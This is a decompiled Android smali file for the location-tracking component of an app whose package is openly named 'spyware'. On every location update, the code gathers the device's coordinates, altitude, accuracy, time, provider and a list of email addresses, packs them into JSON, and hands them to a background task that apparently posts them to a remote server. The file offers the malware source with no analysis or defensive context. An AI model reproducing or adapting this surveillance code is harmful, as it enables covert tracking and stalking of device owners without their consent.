.class Landroid/spyware/services/TrackerS$1;
.super Ljava/lang/Object;
.source "TrackerS.java"

# interfaces
.implements Landroid/location/LocationListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Landroid/spyware/services/TrackerS;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Landroid/spyware/services/TrackerS;


# direct methods
.method constructor <init>(Landroid/spyware/services/TrackerS;)V
    .registers 2
    .param p1, "this$0"    # Landroid/spyware/services/TrackerS;

    .prologue
    .line 59
    iput-object v1, v0, Landroid/spyware/services/TrackerS$1;->this$0:Landroid/spyware/services/TrackerS;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onLocationChanged(Landroid/location/Location;)V
    .registers 15
    .param p1, "location"    # Landroid/location/Location;

    .prologue
    .line 63
    const-string v1, "::trace"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-class v3, Landroid/spyware/services/TrackerS;

    invoke-virtual {v3}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "->onLocationChanged:"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 66
    new-instance v0, Landroid/spyware/model/Position;

    invoke-virtual {v14}, Landroid/location/Location;->getAccuracy()F

    move-result v1

    invoke-virtual {v14}, Landroid/location/Location;->getAltitude()D

    move-result-wide v2

    new-instance v4, Ljava/util/Date;

    invoke-virtual {v14}, Landroid/location/Location;->getTime()J

    move-result-wide v6

    invoke-direct {v4, v6, v7}, Ljava/util/Date;-><init>(J)V

    iget-object v5, v13, Landroid/spyware/services/TrackerS$1;->this$0:Landroid/spyware/services/TrackerS;

    .line 67
    # getter for: Landroid/spyware/services/TrackerS;->email_addresses:Ljava/util/List;
    invoke-static {v5}, Landroid/spyware/services/TrackerS;->access$000(Landroid/spyware/services/TrackerS;)Ljava/util/List;

    move-result-object v5

    invoke-virtual {v14}, Landroid/location/Location;->getLatitude()D

    move-result-wide v6

    invoke-virtual {v14}, Landroid/location/Location;->getLongitude()D

    move-result-wide v8

    .line 68
    invoke-virtual {v14}, Landroid/location/Location;->getProvider()Ljava/lang/String;

    move-result-object v10

    invoke-direct/range {v0 .. v10}, Landroid/spyware/model/Position;-><init>(FDLjava/util/Date;Ljava/util/List;DDLjava/lang/String;)V

    .line 71
    .local v0, "position":Landroid/spyware/model/Position;
    new-instance v11, Landroid/spyware/utils/Parameter;

    const-string v1, "Tracker"

    invoke-virtual {v0}, Landroid/spyware/model/Position;->toJSON()Lorg/json/JSONObject;

    move-result-object v2

    invoke-direct {v11, v1, v2}, Landroid/spyware/utils/Parameter;-><init>(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 72
    .local v11, "params":Landroid/spyware/utils/Parameter;
    new-instance v12, Landroid/spyware/utils/PostDataAT;

    invoke-direct {v12}, Landroid/spyware/utils/PostDataAT;-><init>()V

    .line 74
    .local v12, "postDataAT":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/spyware/utils/Parameter;Ljava/lang/Void;Ljava/lang/Integer;>;"
    const/4 v1, 0x1

    new-array v1, v1, [Landroid/spyware/utils/Parameter;

    const/4 v2, 0x0

    aput-object v11, v1, v2

    invoke-virtual {v12, v1}, Landroid/os/AsyncTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 75
    return-void
.end method

.method public onProviderDisabled(Ljava/lang/String;)V
    .registers 5
    .param p1, "provider"    # Ljava/lang/String;

    .prologue
    .line 87
    const-string v0, "::trace"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-class v2, Landroid/spyware/services/TrackerS;

    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "->onProviderDisabled:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v4}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 90
    iget-object v0, v3, Landroid/spyware/services/TrackerS$1;->this$0:Landroid/spyware/services/TrackerS;

    # invokes: Landroid/spyware/services/TrackerS;->setLocationListener()V
    invoke-static {v0}, Landroid/spyware/services/TrackerS;->access$100(Landroid/spyware/services/TrackerS;)V

    .line 91
    return-void
.end method

.method public onProviderEnabled(Ljava/lang/String;)V
    .registers 5
    .param p1, "provider"    # Ljava/lang/String;

    .prologue
    .line 96
    const-string v0, "::trace"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-class v2, Landroid/spyware/services/TrackerS;

    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "->onProviderEnabled:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v4}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 99
    iget-object v0, v3, Landroid/spyware/services/TrackerS$1;->this$0:Landroid/spyware/services/TrackerS;

    # invokes: Landroid/spyware/services/TrackerS;->setLocationListener()V
    invoke-static {v0}, Landroid/spyware/services/TrackerS;->access$100(Landroid/spyware/services/TrackerS;)V

    .line 100
    return-void
.end method

.method public onStatusChanged(Ljava/lang/String;ILandroid/os/Bundle;)V
    .registers 7
    .param p1, "provider"    # Ljava/lang/String;
    .param p2, "status"    # I
    .param p3, "extras"    # Landroid/os/Bundle;

    .prologue
    .line 80
    const-string v0, "::trace"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-class v2, Landroid/spyware/services/TrackerS;

    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "->onStatusChanged:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v4}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " - "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 82
    return-void
.end method
